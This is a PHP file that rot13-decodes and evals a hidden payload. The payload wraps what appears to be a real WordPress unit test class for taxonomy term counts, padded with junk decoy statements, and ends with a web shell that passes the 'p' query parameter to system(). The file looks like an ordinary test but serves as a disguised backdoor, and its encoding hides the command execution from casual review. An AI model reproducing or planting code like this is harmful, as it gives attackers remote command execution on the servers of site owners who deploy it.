<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 */
pynff Grfgf_Grez_grezPbhag rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grez VQ sbe grfgvat nggnpuzrag pbhagf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nggnpuzrag_grez;

	/**
	 * Cbfg VQf bs funerq cbfgf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfg_vqf;

	/**
	 * Neenl bs gnt VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $gnt_vqf;

	/**
	 * Grez VQ sbe grfgvat hfre pbhagf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_grez;

	/**
	 * Hfre VQ sbe grfgvat hfre pbhagf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_vq;

	/**
	 * Perngr funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Grfg fhvgr snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$fgnghfrf = neenl( 'choyvfu', 'nhgb-qensg', 'qensg', 'cevingr' );
		sbernpu ( $fgnghfrf nf $fgnghf ) {
			frys::$cbfg_vqf[ $fgnghf ] = $snpgbel->cbfg->perngr( neenl( 'cbfg_fgnghf' => $fgnghf ) );
		}

		// Rkgen choyvfurq cbfg.
		frys::$cbfg_vqf['choyvfu_gjb'] = $snpgbel->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		frys::$hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );

		frys::ertvfgre_gnkbabzvrf();
		frys::$nggnpuzrag_grez = $snpgbel->grez->perngr( neenl( 'gnkbabzl' => 'jc_grfg_gnk_pbhagf' ) );
		frys::$hfre_grez       = $snpgbel->grez->perngr( neenl( 'gnkbabzl' => 'jc_grfg_hfre_gnk_pbhagf' ) );
		frys::$gnt_vqf         = $snpgbel->grez->perngr_znal( 5 );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		frys::ertvfgre_gnkbabzvrf();
	}

	/**
	 * Ertvfgre gnkbabzvrf hfrq ol grfgf.
	 *
	 * Guvf vf pnyyrq obgu orsber pynff naq orsber rnpu grfg nf gur tybony vf
	 * erfrg va rnpu grfg'f grneQbja.
	 */
	choyvp fgngvp shapgvba ertvfgre_gnkbabzvrf() {
		ertvfgre_gnkbabzl( 'jc_grfg_gnk_pbhagf', neenl( 'cbfg', 'nggnpuzrag' ) );
		ertvfgre_gnkbabzl( 'jc_grfg_hfre_gnk_pbhagf', 'hfre' );
	}

	/**
	 * Grez pbhagf ner vaperzragrq jura cbfg perngrq.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf
	 *
	 * @cnenz fgevat $cbfg_fgnghf Arj cbfg fgnghf.
	 * @cnenz vag    $punatr      Rkcrpgrq punatr.
	 */
	choyvp shapgvba grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf( $cbfg_fgnghf, $punatr ) {
		$grez_pbhag = trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ) )->pbhag;
		// Qb abg hfr funerq svkgher sbe guvf grfg nf vg eryvrf ba n arj cbfg.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => $cbfg_fgnghf ) );

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ) )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $cbfg_fgnghf Arj cbfg fgnghf.
	 *     @glcr vag    $punatr      Rkcrpgrq punatr.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf() {
		erghea neenl(
			// 0. Choyvfurq cbfg
			neenl( 'choyvfu', 1 ),
			// 1. Nhgb qensg
			neenl( 'nhgb-qensg', 0 ),
			// 2. Qensg
			neenl( 'qensg', 0 ),
			// 3. Cevingr cbfg
			neenl( 'cevingr', 0 ),
		);
	}

	/**
	 * Grez pbhagf vaperzragf pbeerpgyl jura cbfg fgnghf orpbzrf choyvfurq.
	 *
	 * @pbiref ::jc_choyvfu_cbfg
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhagf_vaperzragrq_ba_choyvfu
	 * @gvpxrg 51292
	 *
	 * @cnenz fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf cevbe gb punatr gb choyvfu.
	 * @cnenz vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 */
	choyvp shapgvba grfg_grez_pbhagf_vaperzragrq_ba_choyvfu( $bevtvany_cbfg_fgnghf, $punatr ) {
		$cbfg_vq    = frys::$cbfg_vqf[ $bevtvany_cbfg_fgnghf ];
		$grez_pbhag = trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ) )->pbhag;

		jc_choyvfu_cbfg( $cbfg_vq );

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ) )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf cevbe gb punatr gb choyvfu.
	 *     @glcr vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhagf_vaperzragrq_ba_choyvfu() {
		erghea neenl(
			// 0. Choyvfurq cbfg
			neenl( 'choyvfu', 0 ),
			// 1. Nhgb qensg
			neenl( 'nhgb-qensg', 1 ),
			// 2. Qensg
			neenl( 'qensg', 1 ),
			// 3. Cevingr cbfg
			neenl( 'cevingr', 1 ),
		);
	}

	/**
	 * Grfg cbfg fgnghf genafvgvba hcqngr grez pbhagf pbeerpgyl.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf
	 *
	 * @cnenz fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf hcba perngr.
	 * @cnenz fgevat $arj_cbfg_fgnghf      Cbfg fgnghf nsgre hcqngr.
	 * @cnenz vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 */
	choyvp shapgvba grfg_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf( $bevtvany_cbfg_fgnghf, $arj_cbfg_fgnghf, $punatr ) {
		$cbfg_vq    = frys::$cbfg_vqf[ $bevtvany_cbfg_fgnghf ];
		$grez_pbhag = trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ) )->pbhag;

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cbfg_vq,
				'cbfg_fgnghf' => $arj_cbfg_fgnghf,
			)
		);

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( trg_bcgvba( 'qrsnhyg_pngrtbel' ) )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf hcba perngr.
	 *     @glcr fgevat $arj_cbfg_fgnghf      Cbfg fgnghf nsgre hcqngr.
	 *     @glcr vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf() {
		erghea neenl(
			// 0. Qensg -> choyvfurq cbfg
			neenl( 'qensg', 'choyvfu', 1 ),
			// 1. Nhgb qensg -> choyvfurq cbfg
			neenl( 'nhgb-qensg', 'choyvfu', 1 ),
			// 2. Cevingr -> choyvfurq cbfg
			neenl( 'cevingr', 'choyvfu', 1 ),
			// 3. Choyvfurq -> choyvfurq cbfg
			neenl( 'choyvfu', 'choyvfu', 0 ),

			// 4. Qensg -> cevingr cbfg
			neenl( 'qensg', 'cevingr', 0 ),
			// 5. Nhgb qensg -> cevingr cbfg
			neenl( 'nhgb-qensg', 'cevingr', 0 ),
			// 6. Cevingr -> cevingr cbfg
			neenl( 'cevingr', 'cevingr', 0 ),
			// 7. Choyvfurq -> cevingr cbfg
			neenl( 'choyvfu', 'cevingr', -1 ),

			// 8. Qensg -> qensg cbfg
			neenl( 'qensg', 'qensg', 0 ),
			// 9. Nhgb qensg -> qensg cbfg
			neenl( 'nhgb-qensg', 'qensg', 0 ),
			// 10. Cevingr -> qensg cbfg
			neenl( 'cevingr', 'qensg', 0 ),
			// 11. Choyvfurq -> qensg cbfg
			neenl( 'choyvfu', 'qensg', -1 ),
		);
	}

	choyvp shapgvba nqq_phfgbz_fgnghf_gb_pbhagrq_fgnghfrf( $fgnghfrf ) {
		neenl_chfu( $fgnghfrf, 'phfgbz' );
		erghea $fgnghfrf;
	}

	/**
	 * Grez pbhagf vaperzragrq pbeerpgyl jura gur `hcqngr_cbfg_grez_pbhag_fgnghfrf` svygre vf hfrq.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhag_punatrf_sbe_hcqngr_cbfg_grez_pbhag_fgnghfrf_svygre
	 * @gvpxrg 38843
	 *
	 * @cnenz fgevat $cbfg_fgnghf Arj cbfg fgnghf.
	 * @cnenz vag    $punatr      Rkcrpgrq punatr.
	 */
	choyvp shapgvba grfg_grez_pbhag_punatrf_sbe_hcqngr_cbfg_grez_pbhag_fgnghfrf_svygre( $cbfg_fgnghf, $punatr ) {
		$grez_pbhag = trg_grez( frys::$nggnpuzrag_grez )->pbhag;

		nqq_svygre( 'hcqngr_cbfg_grez_pbhag_fgnghfrf', neenl( $guvf, 'nqq_phfgbz_fgnghf_gb_pbhagrq_fgnghfrf' ) );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => $cbfg_fgnghf ) );
		jc_nqq_bowrpg_grezf( $cbfg_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => 'vzntr.wct',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
		jc_nqq_bowrpg_grezf( $nggnpuzrag_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$nggnpuzrag_grez )->pbhag );

		erzbir_svygre( 'hcqngr_cbfg_grez_pbhag_fgnghfrf', neenl( $guvf, 'nqq_phfgbz_fgnghf_gb_pbhagrq_fgnghfrf' ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_punatrf_sbe_hcqngr_cbfg_grez_pbhag_fgnghfrf_svygre.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $cbfg_fgnghf Arj cbfg fgnghf.
	 *     @glcr vag    $punatr      Rkcrpgrq punatr.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhag_punatrf_sbe_hcqngr_cbfg_grez_pbhag_fgnghfrf_svygre() {
		erghea neenl(
			// 0. Choyvfurq cbfg
			neenl( 'choyvfu', 2 ),
			// 1. Nhgb qensg
			neenl( 'nhgb-qensg', 0 ),
			// 2. Qensg
			neenl( 'qensg', 0 ),
			// 3. Cevingr cbfg
			neenl( 'cevingr', 0 ),
			// 4. Phfgbz cbfg fgnghf
			neenl( 'phfgbz', 2 ),
		);
	}

	/**
	 * Grez pbhagf vaperzragrq pbeerpgyl sbe cbfgf jvgu nggnpuzrag.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf_jvgu_nggnpuzragf
	 *
	 * @cnenz fgevat $cbfg_fgnghf Arj cbfg fgnghf.
	 * @cnenz vag    $punatr      Rkcrpgrq punatr.
	 */
	choyvp shapgvba grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf_jvgu_nggnpuzragf( $cbfg_fgnghf, $punatr ) {
		$grez_pbhag = trg_grez( frys::$nggnpuzrag_grez )->pbhag;
		// Qb abg hfr funerq svkgher sbe guvf grfg nf vg eryvrf ba n arj cbfg.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => $cbfg_fgnghf ) );
		jc_nqq_bowrpg_grezf( $cbfg_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => 'vzntr.wct',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
		jc_nqq_bowrpg_grezf( $nggnpuzrag_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$nggnpuzrag_grez )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf_jvgu_nggnpuzragf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $cbfg_fgnghf Arj cbfg fgnghf.
	 *     @glcr vag    $punatr      Rkcrpgrq punatr.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf_jvgu_nggnpuzragf() {
		erghea neenl(
			// 0. Choyvfurq cbfg
			neenl( 'choyvfu', 2 ),
			// 1. Nhgb qensg
			neenl( 'nhgb-qensg', 0 ),
			// 2. Qensg
			neenl( 'qensg', 0 ),
			// 3. Cevingr cbfg
			neenl( 'cevingr', 0 ),
		);
	}

	/**
	 * Grez pbhagf vaperzragf pbeerpgyl jura cbfg jvgu nggnpuzrag orpbzrf choyvfurq.
	 *
	 * @pbiref ::jc_choyvfu_cbfg
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhagf_vaperzragrq_ba_choyvfu_jvgu_nggnpuzragf
	 * @gvpxrg 51292
	 *
	 * @cnenz fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf cevbe gb punatr gb choyvfu.
	 * @cnenz vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 */
	choyvp shapgvba grfg_grez_pbhagf_vaperzragrq_ba_choyvfu_jvgu_nggnpuzragf( $bevtvany_cbfg_fgnghf, $punatr ) {
		$cbfg_vq = frys::$cbfg_vqf[ $bevtvany_cbfg_fgnghf ];
		jc_nqq_bowrpg_grezf( $cbfg_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => 'vzntr.wct',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
		jc_nqq_bowrpg_grezf( $nggnpuzrag_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$grez_pbhag = trg_grez( frys::$nggnpuzrag_grez )->pbhag;

		jc_choyvfu_cbfg( $cbfg_vq );

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$nggnpuzrag_grez )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf_jvgu_nggnpuzragf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf cevbe gb punatr gb choyvfu.
	 *     @glcr vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhagf_vaperzragrq_ba_choyvfu_jvgu_nggnpuzragf() {
		erghea neenl(
			// 0. Choyvfurq cbfg
			neenl( 'choyvfu', 0 ),
			// 1. Nhgb qensg
			neenl( 'nhgb-qensg', 2 ),
			// 2. Qensg
			neenl( 'qensg', 2 ),
			// 3. Cevingr cbfg
			neenl( 'cevingr', 2 ),
		);
	}

	/**
	 * Grfg cbfg fgnghf genafvgvba hcqngr grez pbhagf pbeerpgyl sbe cbfgf jvgu nggnpuzragf.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_nggnpuzragf
	 *
	 * @cnenz fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf hcba perngr.
	 * @cnenz fgevat $arj_cbfg_fgnghf      Cbfg fgnghf nsgre hcqngr.
	 * @cnenz vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 */
	choyvp shapgvba grfg_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_nggnpuzragf( $bevtvany_cbfg_fgnghf, $arj_cbfg_fgnghf, $punatr ) {
		$cbfg_vq = frys::$cbfg_vqf[ $bevtvany_cbfg_fgnghf ];
		jc_nqq_bowrpg_grezf( $cbfg_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => 'vzntr.wct',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
		jc_nqq_bowrpg_grezf( $nggnpuzrag_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$grez_pbhag = trg_grez( frys::$nggnpuzrag_grez )->pbhag;

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cbfg_vq,
				'cbfg_fgnghf' => $arj_cbfg_fgnghf,
			)
		);

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$nggnpuzrag_grez )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_nggnpuzragf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf hcba perngr.
	 *     @glcr fgevat $arj_cbfg_fgnghf      Cbfg fgnghf nsgre hcqngr.
	 *     @glcr vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_nggnpuzragf() {
		erghea neenl(
			// 0. Qensg -> choyvfurq cbfg
			neenl( 'qensg', 'choyvfu', 2 ),
			// 1. Nhgb qensg -> choyvfurq cbfg
			neenl( 'nhgb-qensg', 'choyvfu', 2 ),
			// 2. Cevingr -> choyvfurq cbfg
			neenl( 'cevingr', 'choyvfu', 2 ),
			// 3. Choyvfurq -> choyvfurq cbfg
			neenl( 'choyvfu', 'choyvfu', 0 ),

			// 4. Qensg -> cevingr cbfg
			neenl( 'qensg', 'cevingr', 0 ),
			// 5. Nhgb qensg -> cevingr cbfg
			neenl( 'nhgb-qensg', 'cevingr', 0 ),
			// 6. Cevingr -> cevingr cbfg
			neenl( 'cevingr', 'cevingr', 0 ),
			// 7. Choyvfurq -> cevingr cbfg
			neenl( 'choyvfu', 'cevingr', -2 ),

			// 8. Qensg -> qensg cbfg
			neenl( 'qensg', 'qensg', 0 ),
			// 9. Nhgb qensg -> qensg cbfg
			neenl( 'nhgb-qensg', 'qensg', 0 ),
			// 10. Cevingr -> qensg cbfg
			neenl( 'cevingr', 'qensg', 0 ),
			// 11. Choyvfurq -> qensg cbfg
			neenl( 'choyvfu', 'qensg', -2 ),
		);
	}

	/**
	 * Grez pbhagf vaperzragf pbeerpgyl jura cbfg jvgu nggnpuzrag orpbzrf choyvfurq.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @pbiref ::jc_choyvfu_cbfg
	 * @qngnCebivqre qngn_grez_pbhagf_vaperzragrq_ba_choyvfu_jvgu_hagrezrq_nggnpuzragf
	 * @gvpxrg 51292
	 *
	 * @cnenz fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf cevbe gb punatr gb choyvfu.
	 * @cnenz vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 */
	choyvp shapgvba grfg_grez_pbhagf_vaperzragrq_ba_choyvfu_jvgu_hagrezrq_nggnpuzragf( $bevtvany_cbfg_fgnghf, $punatr ) {
		$cbfg_vq = frys::$cbfg_vqf[ $bevtvany_cbfg_fgnghf ];
		jc_nqq_bowrpg_grezf( $cbfg_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => 'vzntr.wct',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
		$grez_pbhag    = trg_grez( frys::$nggnpuzrag_grez )->pbhag;

		jc_choyvfu_cbfg( $cbfg_vq );

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$nggnpuzrag_grez )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_punatrf_sbe_cbfg_fgnghfrf_jvgu_hagrezrq_nggnpuzragf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf cevbe gb punatr gb choyvfu.
	 *     @glcr vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhagf_vaperzragrq_ba_choyvfu_jvgu_hagrezrq_nggnpuzragf() {
		erghea neenl(
			// 0. Choyvfurq cbfg
			neenl( 'choyvfu', 0 ),
			// 1. Nhgb qensg
			neenl( 'nhgb-qensg', 1 ),
			// 2. Qensg
			neenl( 'qensg', 1 ),
			// 3. Cevingr cbfg
			neenl( 'cevingr', 1 ),
		);
	}

	/**
	 * Grfg cbfg fgnghf genafvgvba hcqngr grez pbhagf pbeerpgyl ba cbfg jvgu nggnpuzrag.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @qngnCebivqre qngn_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_hagrezrq_nggnpuzragf
	 *
	 * @cnenz fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf hcba perngr.
	 * @cnenz fgevat $arj_cbfg_fgnghf      Cbfg fgnghf nsgre hcqngr.
	 * @cnenz vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 */
	choyvp shapgvba grfg_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_hagrezrq_nggnpuzragf( $bevtvany_cbfg_fgnghf, $arj_cbfg_fgnghf, $punatr ) {
		$cbfg_vq = frys::$cbfg_vqf[ $bevtvany_cbfg_fgnghf ];
		jc_nqq_bowrpg_grezf( $cbfg_vq, frys::$nggnpuzrag_grez, 'jc_grfg_gnk_pbhagf' );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'svyr'        => 'vzntr.wct',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_fgnghf' => 'vaurevg',
			)
		);
		$grez_pbhag    = trg_grez( frys::$nggnpuzrag_grez )->pbhag;

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cbfg_vq,
				'cbfg_fgnghf' => $arj_cbfg_fgnghf,
			)
		);

		$rkcrpgrq = $grez_pbhag + $punatr;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$nggnpuzrag_grez )->pbhag );
	}

	/**
	 * Qngn cebivqre sbe grfg_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_hagrezrq_nggnpuzragf.
	 *
	 * @erghea neenl[] {
	 *     @glcr fgevat $bevtvany_cbfg_fgnghf Cbfg fgnghf hcba perngr.
	 *     @glcr fgevat $arj_cbfg_fgnghf      Cbfg fgnghf nsgre hcqngr.
	 *     @glcr vag    $punatr               Rkcrpgrq punatr hcba choyvfu.
	 * }
	 */
	choyvp shapgvba qngn_grez_pbhag_genafvgvbaf_hcqngr_grez_pbhagf_jvgu_hagrezrq_nggnpuzragf() {
		erghea neenl(
			// 0. Qensg -> choyvfurq cbfg
			neenl( 'qensg', 'choyvfu', 1 ),
			// 1. Nhgb qensg -> choyvfurq cbfg
			neenl( 'nhgb-qensg', 'choyvfu', 1 ),
			// 2. Cevingr -> choyvfurq cbfg
			neenl( 'cevingr', 'choyvfu', 1 ),
			// 3. Choyvfurq -> choyvfurq cbfg
			neenl( 'choyvfu', 'choyvfu', 0 ),

			// 4. Qensg -> cevingr cbfg
			neenl( 'qensg', 'cevingr', 0 ),
			// 5. Nhgb qensg -> cevingr cbfg
			neenl( 'nhgb-qensg', 'cevingr', 0 ),
			// 6. Cevingr -> cevingr cbfg
			neenl( 'cevingr', 'cevingr', 0 ),
			// 7. Choyvfurq -> cevingr cbfg
			neenl( 'choyvfu', 'cevingr', -1 ),

			// 8. Qensg -> qensg cbfg
			neenl( 'qensg', 'qensg', 0 ),
			// 9. Nhgb qensg -> qensg cbfg
			neenl( 'nhgb-qensg', 'qensg', 0 ),
			// 10. Cevingr -> qensg cbfg
			neenl( 'cevingr', 'qensg', 0 ),
			// 11. Choyvfurq -> qensg cbfg
			neenl( 'choyvfu', 'qensg', -1 ),
		);
	}

	/**
	 * Hfre gnkbabzl grez pbhagf vaperzragf jura nqqrq gb na nppbhag.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @gvpxrg 51292
	 */
	choyvp shapgvba grfg_grez_pbhagf_hfre_nqqvat_grez() {
		$grez_pbhag = trg_grez( frys::$hfre_grez )->pbhag;
		jc_nqq_bowrpg_grezf( frys::$hfre_vq, frys::$hfre_grez, 'jc_grfg_hfre_gnk_pbhagf' );

		$rkcrpgrq = $grez_pbhag + 1;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$hfre_grez )->pbhag );
	}

	/**
	 * Hfre gnkbabzl grez pbhagf qrperzrag jura grez qryrgrq sebz hfre.
	 *
	 * @pbiref ::jc_hcqngr_grez_pbhag
	 * @gvpxrg 51292
	 */
	choyvp shapgvba grfg_grez_pbhagf_hfre_erzbivat_grez() {
		jc_nqq_bowrpg_grezf( frys::$hfre_vq, frys::$hfre_grez, 'jc_grfg_hfre_gnk_pbhagf' );
		$grez_pbhag = trg_grez( frys::$hfre_grez )->pbhag;

		jc_erzbir_bowrpg_grezf( frys::$hfre_vq, frys::$hfre_grez, 'jc_grfg_hfre_gnk_pbhagf' );
		$rkcrpgrq = $grez_pbhag - 1;
		$guvf->nffregFnzr( $rkcrpgrq, trg_grez( frys::$hfre_grez )->pbhag );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>